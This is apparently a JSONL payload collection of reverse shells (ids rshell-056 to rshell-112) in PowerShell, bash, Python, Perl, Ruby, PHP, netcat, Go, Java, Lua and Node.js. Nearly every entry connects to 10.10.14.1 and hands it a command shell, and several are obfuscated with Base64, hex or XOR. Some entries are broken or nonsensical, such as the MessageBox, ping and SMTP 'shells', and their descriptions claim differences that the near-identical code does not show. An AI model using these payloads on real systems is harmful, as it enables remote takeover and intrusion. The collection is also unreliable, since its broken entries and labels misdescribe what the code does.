{"id":"rshell-056","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with reliable data streaming.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-057","language":"python","payload":"python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024).decode();p=subprocess.run(d,shell=True,capture_output=True);s.send(p.stdout+p.stderr)'","description":"Python TCP reverse shell with subprocess.run execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","python"]}
{"id":"rshell-058","language":"powershell","payload":"$s=[System.Net.Sockets.TcpClient]::new('10.10.14.1',22);$t=$s.GetStream();$w=New-Object IO.StreamWriter($t);$r=New-Object IO.StreamReader($t);while($true){$c=$r.ReadLine();$o=(Invoke-Expression $c 2>&1|Out-String);$w.WriteLine($o);$w.Flush()}","description":"PowerShell TCP reverse shell over SSH-like port for tunneling.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-059","language":"netcat","payload":"nc 10.10.14.1 4444 -e /bin/sh","description":"Netcat TCP reverse shell with direct shell execution.","platform":"Linux","requires_netcat":true,"obfuscated":false,"tag":["tcp","netcat"]}
{"id":"rshell-060","language":"powershell","payload":"$x=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE0LjEnLDQ0NDQpOyRzPSRjLkdldFN0cmVhbSgpOyRiPU5ldy1PYmplY3QgQnl0ZVtdIDY1NTM1O3doaWxlKCgkaT0kcy5SZWFkKCRiLDAsJGIuTGVuZ3RoKSktbmUgMCl7JGQ9KFtTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nXTo6R2V0U3RyaW5nKCRiLDAsJGkpKTskbz0oaWV4ICRkIDI+JjF8T3V0LVN0cmluZyk7JHA9JG8rJ1BTICcrKHB3ZCkuUGF0aCsnPiAnOyRlPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRwKTskcy5Xcml0ZSgkZSw0LCRlLkxlbmd0aCk7JHMuRmx1c2goKX07JGMuQ2xvc2UoKQ=='));iex $x","description":"Obfuscated PowerShell TCP reverse shell using script block encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated"]}
{"id":"rshell-061","language":"bash","payload":"bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'","description":"Bash TCP reverse shell with nested bash invocation.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","bash"]}
{"id":"rshell-062","language":"powershell","payload":"$t=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$t.GetStream();$b=New-Object Byte[] 65535;while(($r=$s.Read($b,0,$b.Length))-ne 0){$c=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);$o=(Invoke-Expression $c 2>&1|Out-String);$p=$o+'PS '+(Get-Location).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$t.Close()","description":"PowerShell TCP reverse shell with robust error handling.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-063","language":"perl","payload":"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"10.10.14.1:4444\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'","description":"Perl TCP reverse shell with IO socket handling.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","perl"]}
{"id":"rshell-064","language":"powershell","payload":"$m=[System.Messaging.MessageQueue]::new('.\private$\cmd');while($true){$c=$m.Receive().Body;$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Messaging.Message]::new($o);[System.Messaging.MessageQueue]::new('.\private$\out').Send($r)}","description":"PowerShell reverse shell using MSMQ for covert communication.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["msmq","powershell"]}
{"id":"rshell-065","language":"ruby","payload":"ruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.1\",4444);loop{c.gets.chomp!;($_==\"exit\")?exit:c.puts(`$_`)}'","description":"Ruby TCP reverse shell with loop-based command execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","ruby"]}
{"id":"rshell-066","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with efficient command processing.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-067","language":"php","payload":"php -r '$s=fsockopen(\"10.10.14.1\",4444);while($c=fgets($s)){exec($c,$o);foreach($o as $l){fwrite($s,$l.\"\\n\");}}'","description":"PHP TCP reverse shell with array-based output handling.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","php"]}
{"id":"rshell-068","language":"powershell","payload":"$a=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE0LjEnLDQ0NDQpOyRzPSRjLkdldFN0cmVhbSgpOyRiPU5ldy1PYmplY3QgQnl0ZVtdIDY1NTM1O3doaWxlKCgkaT0kcy5SZWFkKCRiLDAsJGIuTGVuZ3RoKSktbmUgMCl7JGQ9KFtTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nXTo6R2V0U3RyaW5nKCRiLDAsJGkpKTskbz0oaWV4ICRkIDI+JjF8T3V0LVN0cmluZyk7JHA9JG8rJ1BTICcrKHB3ZCkuUGF0aCsnPiAnOyRlPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRwKTskcy5Xcml0ZSgkZSw0LCRlLkxlbmd0aCk7JHMuRmx1c2goKX07JGMuQ2xvc2UoKQ=='));iex $a","description":"Obfuscated PowerShell TCP reverse shell with AMSI-like bypass encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated"]}
{"id":"rshell-069","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do $line >&5 2>&5;done'","description":"Bash TCP reverse shell with file descriptor command loop.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","bash"]}
{"id":"rshell-070","language":"powershell","payload":"$r=[System.Windows.Forms.MessageBox]::Show('cmd');while($true){$c=$r;$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Windows.Forms.MessageBox]::Show($o)}","description":"PowerShell reverse shell using RDP-like GUI interaction.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["gui","powershell"]}
{"id":"rshell-071","language":"python","payload":"python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(\"/bin/sh\")'","description":"Python TCP reverse shell with os.system execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","python"]}
{"id":"rshell-072","language":"powershell","payload":"$t=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$t.GetStream();$b=New-Object Byte[] 65535;while(($r=$s.Read($b,0,$b.Length))-ne 0){$c=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);$o=(Invoke-Expression $c 2>&1|Out-String);$p=$o+'PS '+(Get-Location).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$t.Close()","description":"PowerShell TCP reverse shell with stable stream management.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-073","language":"netcat","payload":"nc -u 10.10.14.1 4444 -e /bin/bash","description":"Netcat UDP reverse shell with bash execution.","platform":"Linux","requires_netcat":true,"obfuscated":false,"tag":["udp","netcat","bash"]}
{"id":"rshell-074","language":"powershell","payload":"$s=[System.Net.Sockets.TcpClient]::new('10.10.14.1',445);$t=$s.GetStream();$b=New-Object Byte[] 65535;while(($i=$t.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$e=([text.encoding]::ASCII).GetBytes($o);$t.Write($e,0,$e.Length);$t.Flush()}","description":"PowerShell TCP reverse shell over SMB-like port.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-075","language":"perl","payload":"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.10.14.1\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'","description":"Perl TCP reverse shell with bash execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","perl","bash"]}
{"id":"rshell-076","language":"powershell","payload":"$q=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE0LjEnLDQ0NDQpOyRzPSRjLkdldFN0cmVhbSgpOyRiPU5ldy1PYmplY3QgQnl0ZVtdIDY1NTM1O3doaWxlKCgkaT0kcy5SZWFkKCRiLDAsJGIuTGVuZ3RoKSktbmUgMCl7JGQ9KFtTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nXTo6R2V0U3RyaW5nKCRiLDAsJGkpKTskbz0oaWV4ICRkIDI+JjF8T3V0LVN0cmluZyk7JHA9JG8rJ1BTICcrKHB3ZCkuUGF0aCsnPiAnOyRlPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRwKTskcy5Xcml0ZSgkZSw0LCRlLkxlbmd0aCk7JHMuRmx1c2goKX07JGMuQ2xvc2UoKQ=='));iex $q","description":"Obfuscated PowerShell TCP reverse shell with dynamic port encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated"]}
{"id":"rshell-077","language":"ruby","payload":"ruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.1\",4444);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'","description":"Ruby TCP reverse shell with piped command execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","ruby"]}
{"id":"rshell-078","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with persistent connection.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-079","language":"php","payload":"php -r '$s=fsockopen(\"10.10.14.1\",4444);while($c=fgets($s)){exec($c,$o);foreach($o as $l){fwrite($s,$l.\"\\n\");}}'","description":"PHP TCP reverse shell with array-based output handling.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","php"]}
{"id":"rshell-080","language":"powershell","payload":"$g=[Grpc.Core.Channel]::new('10.10.14.1:50051', [Grpc.Core.ChannelCredentials]::Insecure);$c=New-Object Grpc.Core.CallInvoker($g);while($true){$r=$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,'cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,$o)}","description":"PowerShell gRPC reverse shell for modern API communication.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["grpc","powershell"]}
{"id":"rshell-081","language":"lua","payload":"lua -e 'local s=require(\"socket\").tcp();s:connect(\"10.10.14.1\",4444);while true do local c=s:receive();local f=io.popen(c,\"r\");local o=f:read(\"*a\");f:close();s:send(o);end'","description":"Lua TCP reverse shell using socket library.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","lua"]}
{"id":"rshell-082","language":"powershell","payload":"$x=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromHexString('24636c69656e74203d204e65772d4f626a6563742053797374656d2e4e65742e536f636b6574732e544350436c69656e74282731302e31302e31342e31272c34343434293b2473747265616d203d2024636c69656e742e47657453747265616d28293b5b627974655b5d5d246279746573203d20302e2e36353533357c257b307d3b7768696c6528282469203d202473747265616d2e52656164282462797465732c20302c202462797465732e4c656e6774682929202d6e652030297b2464617461203d20284e65772d4f626a656374202d547970654e616d652053797374656d2e546578742e4153434949456e636f64696e67292e476574537472696e67282462797465732c302c202469293b2473656e646261636b203d202869657820246461746120323e2631207c204f75742d537472696e6720293b2473656e646261636b32203d202473656e646261636b202b202750532027202b2028707764292e50617468202b20273e20273b2473656e6462797465203d20285b746578742e656e636f64696e675d3a3a4153434949292e4765744279746573282473656e646261636b32293b2473747265616d2e5772697465282473656e64627974652c302c2473656e64627974652e4c656e677468293b2473747265616d2e466c7573682829297d3b24636c69656e742e436c6f73652829'));iex $x","description":"Obfuscated PowerShell TCP reverse shell using hex encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","hex"]}
{"id":"rshell-083","language":"go","payload":"package main;import(\"net\";\"os/exec\";\"bufio\");func main(){c,_:=net.Dial(\"tcp\",\"10.10.14.1:4444\");for{r:=bufio.NewReader(c);cmd,_:=r.ReadString('\\n');out,_:=exec.Command(\"bash\",\"-c\",cmd).Output();c.Write(out)}}","description":"Go TCP reverse shell executing bash commands.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","go","bash"]}
{"id":"rshell-084","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$c=[System.Web.HttpUtility]::UrlEncode('$o=(Invoke-Expression ([System.Web.HttpUtility]::UrlDecode($wc.DownloadString(\"https://10.10.14.1:8443/cmd\"))) 2>&1|Out-String);$wc.UploadString(\"https://10.10.14.1:8443/out\",$o)');iex $c","description":"PowerShell HTTPS reverse shell with URL-encoded payload.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["https","powershell","obfuscated","urlencode"]}
{"id":"rshell-085","language":"nodejs","payload":"require('net').createConnection(4444,'10.10.14.1').on('connect',s=>s.pipe(require('child_process').spawn('/bin/sh').stdin).pipe(s))","description":"Node.js TCP reverse shell spawning a shell.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","nodejs"]}
{"id":"rshell-086","language":"powershell","payload":"$u=[System.Net.Sockets.UdpClient]::new('10.10.14.1',4444);$b=[byte[]]::new(65535);$d=$u.Receive([ref]$b);$c=[System.Text.Encoding]::ASCII.GetString($b,0,$d.Length);$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Text.Encoding]::ASCII.GetBytes($o);$u.Send($r,$r.Length)","description":"PowerShell UDP reverse shell with single command execution.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["udp","powershell"]}
{"id":"rshell-087","language":"bash","payload":"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do $line >&3 2>&3;done'","description":"Bash UDP reverse shell using file descriptor loop.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["udp","bash"]}
{"id":"rshell-088","language":"powershell","payload":"$k=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([System.Text.Encoding]::ASCII.GetBytes('$c=New-Object Net.Sockets.TCPClient(\"10.10.14.1\",4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+\"PS \"+(pwd).Path+\"> \";$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()'),[Func[byte,byte]]{param($b);$b -bxor 0x5A})));iex $k","description":"Obfuscated PowerShell TCP reverse shell using XOR encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","xor"]}
{"id":"rshell-089","language":"python","payload":"python3 -c 'import socket,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=base64.b64decode(d).decode();p=os.popen(c);s.send(base64.b64encode(p.read().encode()))'","description":"Python TCP reverse shell with Base64-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","base64"]}
{"id":"rshell-090","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;while($true){$c=$wc.DownloadString('http://10.10.14.1:8080/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('http://10.10.14.1:8080/out',[System.Web.HttpUtility]::UrlEncode($o))}","description":"PowerShell HTTP reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["http","powershell"]}
{"id":"rshell-091","language":"php","payload":"php -r '$s=fsockopen(\"10.10.14.1\",4444);while($c=fgets($s)){exec(bin2hex($c),$o);foreach($o as $l){fwrite($s,hex2bin($l));}}'","description":"PHP TCP reverse shell with hex-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","php","obfuscated","hex"]}
{"id":"rshell-092","language":"powershell","payload":"$d=[System.Net.Dns]::GetHostEntry('cmd.10.10.14.1');$c=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($d.AddressList[0].IPAddressToString));$o=(Invoke-Expression $c 2>&1|Out-String);$r=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o));[System.Net.Dns]::GetHostEntry(\"$r.out.10.10.14.1\")","description":"PowerShell DNS reverse shell with Base64-encoded commands.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["dns","powershell","obfuscated","base64"]}
{"id":"rshell-093","language":"netcat","payload":"nc 10.10.14.1 4444 -e /bin/bash | xxd -p | nc 10.10.14.1 4445","description":"Netcat TCP reverse shell with hex-encoded output redirection.","platform":"Linux","requires_netcat":true,"obfuscated":true,"tag":["tcp","netcat","obfuscated","hex"]}
{"id":"rshell-094","language":"powershell","payload":"$p=[System.Net.NetworkInformation.Ping]::new();$c=$p.Send('10.10.14.1').RoundtripTime;$o=(Invoke-Expression $c 2>&1|Out-String);$b=[System.Text.Encoding]::ASCII.GetBytes([System.Web.HttpUtility]::UrlEncode($o));$p.Send('10.10.14.1',1000,$b)","description":"PowerShell ICMP reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["icmp","powershell","obfuscated","urlencode"]}
{"id":"rshell-095","language":"java","payload":"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(\"10.10.14.1\",4444);Process p=Runtime.getRuntime().exec(\"/bin/sh\");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}","description":"Java TCP reverse shell executing a shell.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","java"]}
{"id":"rshell-096","language":"powershell","payload":"$ws=[System.Net.WebSockets.ClientWebSocket]::new();$ct=[System.Threading.CancellationToken]::new($false);$ws.ConnectAsync([System.Uri]::new('ws://10.10.14.1:8080'),$ct).Wait();$b=New-Object Byte[] 65535;$m=New-Object System.ArraySegment[byte]($b);$r=$ws.ReceiveAsync($m,$ct).Result;$c=[System.Text.Encoding]::ASCII.GetString($b,0,$r.Count);$o=(iex $c 2>&1|Out-String);$e=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$ws.SendAsync([System.ArraySegment[byte]]::new($e),[System.Net.WebSockets.WebSocketMessageType]::Text,$true,$ct).Wait()","description":"PowerShell WebSocket reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["websocket","powershell","obfuscated","base64"]}
{"id":"rshell-097","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with hex-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","hex"]}
{"id":"rshell-098","language":"powershell","payload":"$m=[System.Net.Mail.SmtpClient]::new('10.10.14.1',25);$c='cmd'+(Get-Random);$o=(Invoke-Expression $c 2>&1|Out-String);$e=New-Object System.Net.Mail.MailMessage('a@b.c',$c,[System.Web.HttpUtility]::UrlEncode($o));$m.Send($e)","description":"PowerShell SMTP reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["smtp","powershell","obfuscated","urlencode"]}
{"id":"rshell-099","language":"perl","payload":"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.10.14.1\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'","description":"Perl TCP reverse shell with bash execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","perl","bash"]}
{"id":"rshell-100","language":"powershell","payload":"$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/cmd');$f.Method=[System.Net.WebRequestMethods+Ftp]::DownloadFile;$r=$f.GetResponse();$s=$r.GetResponseStream();$b=New-Object IO.StreamReader($s);$c=$b.ReadToEnd();$o=(iex $c 2>&1|Out-String);$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/out');$f.Method=[System.Net.WebRequestMethods+Ftp]::UploadFile;$w=$f.GetRequestStream();$w.Write([System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o))),0,$o.Length);$w.Close()","description":"PowerShell FTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["ftp","powershell","obfuscated","base64"]}
{"id":"rshell-101","language":"ruby","payload":"ruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.1\",4444);while(cmd=c.gets);cmd=URI.decode(cmd);IO.popen(cmd,\"r\"){|io|c.print URI.encode(io.read)}end'","description":"Ruby TCP reverse shell with URL-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","ruby","obfuscated","urlencode"]}
{"id":"rshell-102","language":"powershell","payload":"$g=[Grpc.Core.Channel]::new('10.10.14.1:50051', [Grpc.Core.ChannelCredentials]::Insecure);$c=New-Object Grpc.Core.CallInvoker($g);$r=$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,'cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell gRPC reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["grpc","powershell","obfuscated","base64"]}
{"id":"rshell-103","language":"python","payload":"python3 -c 'import socket,os,urllib.parse;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024).decode();c=urllib.parse.unquote(d);p=os.popen(c);s.send(urllib.parse.quote(p.read()).encode())'","description":"Python TCP reverse shell with URL-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","urlencode"]}
{"id":"rshell-104","language":"powershell","payload":"$m=[System.Messaging.MessageQueue]::new('.\private$\cmd');$c=$m.Receive().Body;$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Messaging.Message]::new([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));[System.Messaging.MessageQueue]::new('.\private$\out').Send($r)","description":"PowerShell MSMQ reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["msmq","powershell","obfuscated","base64"]}
{"id":"rshell-105","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with Base64-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","base64"]}
{"id":"rshell-106","language":"powershell","payload":"$r=[System.Windows.Forms.MessageBox]::Show('cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$r=[System.Windows.Forms.MessageBox]::Show([System.Web.HttpUtility]::UrlEncode($o))","description":"PowerShell GUI reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["gui","powershell","obfuscated","urlencode"]}
{"id":"rshell-107","language":"lua","payload":"lua -e 'local s=require(\"socket\").udp();s:setpeername(\"10.10.14.1\",4444);while true do local c=s:receive();local f=io.popen(c,\"r\");local o=f:read(\"*a\");f:close();s:send(o);end'","description":"Lua UDP reverse shell using socket library.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["udp","lua"]}
{"id":"rshell-108","language":"powershell","payload":"$x=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([System.Text.Encoding]::ASCII.GetBytes('$c=New-Object Net.Sockets.TCPClient(\"10.10.14.1\",4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+\"PS \"+(pwd).Path+\"> \";$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()'),[Func[byte,byte]]{param($b);$b -bxor 0x3C})));iex $x","description":"Obfuscated PowerShell TCP reverse shell using XOR encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","xor"]}
{"id":"rshell-109","language":"go","payload":"package main;import(\"net\";\"os/exec\";\"encoding/base64\");func main(){c,_:=net.Dial(\"tcp\",\"10.10.14.1:4444\");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=base64.StdEncoding.DecodeString(string(b[:n]));out,_:=exec.Command(\"bash\",\"-c\",string(cmd)).Output();c.Write([]byte(base64.StdEncoding.EncodeToString(out)))}}","description":"Go TCP reverse shell with Base64-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","go","obfuscated","base64"]}
{"id":"rshell-110","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$c=$wc.DownloadString('https://10.10.14.1:8443/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('https://10.10.14.1:8443/out',[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell HTTPS reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["https","powershell","obfuscated","base64"]}
{"id":"rshell-111","language":"nodejs","payload":"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(d.toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))","description":"Node.js TCP reverse shell with compressed Base64 output.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","nodejs","obfuscated","base64","compressed"]}
{"id":"rshell-112","language":"powershell","payload":"$u=[System.Net.Sockets.UdpClient]::new('10.10.14.1',4444);$b=[byte[]]::new(65535);$d=$u.Receive([ref]$b);$c=[System.Text.Encoding]::ASCII.GetString($b,0,$d.Length);$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Text.Encoding]::ASCII.GetBytes([System.Web.HttpUtility]::UrlEncode($o));$u.Send($r,$r.Length)","description":"PowerShell UDP reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["udp","powershell","obfuscated","urlencode"]}
